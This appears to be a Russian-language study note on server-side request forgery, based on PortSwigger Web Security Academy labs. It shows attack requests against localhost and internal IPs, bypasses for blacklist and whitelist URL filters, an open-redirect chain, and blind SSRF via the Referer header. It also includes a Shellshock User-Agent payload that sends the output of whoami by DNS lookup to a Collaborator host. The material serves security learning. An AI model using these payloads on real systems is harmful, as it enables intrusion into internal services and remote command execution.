[Server-side request forgery](https://portswigger.net/web-security/ssrf)

[SSRF Cheat Sheet & Bypass Techniques](https://highon.coffee/blog/ssrf-cheat-sheet)

## Распространенные атаки SSRF
### SSRF против самого сервера
При атаке SSRF на сам сервер злоумышленник заставляет приложение сделать HTTP-запрос обратно на сервер, на котором размещено приложение, через его loopback сетевой интерфейс. Обычно это включает в себя предоставление URL с именем хоста, например `127.0.0.1` или `localhost`.

Запрос к API для проверки наличия товара на складе:

	POST /product/stock HTTP/1.0 Content-Type: application/x-www-form-urlencoded
	Content-Length: 118
	stockApi=http://stock.weliketoshop.net:8080/product/stock/check%3FproductId%3D6%26storeId%3D1

В этой ситуации злоумышленник может изменить запрос, чтобы указать URL, локальный для самого сервера:

	POST /product/stock HTTP/1.0 
	Content-Type: application/x-www-form-urlencoded 
	Content-Length: 118 
	stockApi=http://localhost/admin

### SSRF на другие внутренние системы

	POST /product/stock HTTP/1.0
	Content-Type: application/x-www-form-urlencoded
	Content-Length: 118
	stockApi=http://192.168.0.68/admin

## Обход распространенных способов защиты от SSRF
### SSRF с входными фильтрами на основе черных списков
Обход фильтра:
- альтернативные IP-представления `127.0.0.1`, например `2130706433`, `017700000001` или `127.1`
- регистрация собственного доменного имени, которое разрешается в `127.0.0.1`. Для этой цели можно использовать `spoofed.burpcollaborator.net`
- Обфускация заблокированных строк с помощью кодировки URL или изменения регистра

### SSRF с входными фильтрами на основе белых списков
Спецификация URL содержит ряд особенностей, которые могут быть упущены при реализации специального разбора и проверки URL:
- учетные данные в URL перед именем хоста, используя символ `@`:

	`https://expected-host@evil-host`

- символ `#` для обозначения фрагмента URL:

	`https://evil-host#expected-host`

- использовать иерархию именования DNS для размещения требуемого ввода в полностью определенном подконтрольном DNS-имени:

	`https://expected-host.evil-host`

- URL-кодировать символы, чтобы запутать код разбора URL. Это особенно полезно, если код, реализующий фильтр, обрабатывает кодированные символы URL иначе, чем код, выполняющий внутренний HTTP-запрос
- использовать комбинации этих методов вместе

### Обход фильтров SSRF через открытое перенаправление
Есть функционал перехода на следующую страницу, которая содержит уязвимость `open redirection`, при которой URL:

	GET /product/nextProduct?currentProductId=1&path=http://192.168.0.12:8080

возвращает перенаправление на:

	`http://192.168.0.12:8080`

Используем уязвимость для обхода фильтра URL и выполняем SSRF:

	POST /product/stock HTTP/1.1
	Host: ac951fab1ffef84ac0f0709400cb00a1.web-security-academy.net
	Content-Type: application/x-www-form-urlencoded
	Content-Length: 88
	
	stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin

Этот SSRF-эксплойт работает потому что приложение сначала проверяет, что предоставленный URL `stockAPI` находится в разрешенном домене, что и происходит. Затем приложение запрашивает предоставленный URL, что вызывает открытое перенаправление. Оно следует перенаправлению и делает запрос на внутренний URL по выбору злоумышленника.

## Слепые SSRF ^91df93

Например, на сайте используется аналитическое программное обеспечение, которое получает URL, указанный в заголовке `Referer`, когда загружается страница продукта:

	GET /product?productId=19 HTTP/1.1
	Host: ac7a1ffc1e47dae5c097263d00ee00b7.web-security-academy.net
	Referer: https://ac7a1ffc1e47dae5c097263d00ee00b7.web-security-academy.net/

Вызов запроса к серверу Burp Collaborator:

	GET /product?productId=19 HTTP/1.1
	Host: ac7a1ffc1e47dae5c097263d00ee00b7.web-security-academy.net
	Referer: http://2wznfi7jzcg9hkmhurnhykpjfal69v.burpcollaborator.net

**Blind SSRF + shellshock**
Shellshock payload: 

	() { :;}; echo "pwned"

Пример запроса:

	GET /product?productId=1 HTTP/1.1
	Host: ac901f3e1ea49cd3c054f7d2005b00d1.web-security-academy.net
	User-Agent: () { :;}; /usr/bin/nslookup $(whoami).6fmtccqu58psg7aj77qad8m9j0psdh.burpcollaborator.net
	Referer: http://192.168.0.§1§:8080

## Поиск скрытой поверхности атаки для уязвимостей SSRF
### Частичные URL-адреса в запросах
Иногда приложение помещает в параметры запроса `только имя хоста или часть пути URL`. Затем переданное значение включается на стороне сервера в полный URL, который запрашивается. Если значение легко распознается как имя хоста или путь URL, то потенциальная поверхность атаки может быть очевидной. Однако возможности использования SSRF могут быть ограничены, поскольку вы не контролируете весь URL, который запрашивается.

### URL в форматах данных
Некоторые приложения передают данные в форматах, спецификация которых позволяет включать URL, которые могут быть запрошены анализатором данных для данного формата. Очевидным примером этого является формат данных `XML`, который широко используется в веб-приложениях для передачи структурированных данных от клиента к серверу. Когда приложение принимает данные в формате `XML` и анализирует их, оно может быть уязвимо для `XXE-инъекции` и, в свою очередь, уязвимо для SSRF через `XXE`.

### SSRF через заголовок Referer
Некоторые приложения используют аналитическое программное обеспечение на стороне сервера, которое отслеживает посетителей. Такое ПО часто регистрирует заголовок `Referer` в запросах, поскольку он представляет особый интерес для отслеживания входящих ссылок. Часто аналитическое программное обеспечение фактически посещает любой сторонний URL, который появляется в заголовке `Referer`. Обычно это делается для анализа содержимого ссылающихся сайтов, включая якорный текст, который используется во входящих ссылках. В результате, заголовок `Referer` часто представляет собой плодотворную поверхность для атаки уязвимостей SSRF (см. [[ssrf#^91df93|Слепые SSRF]]).
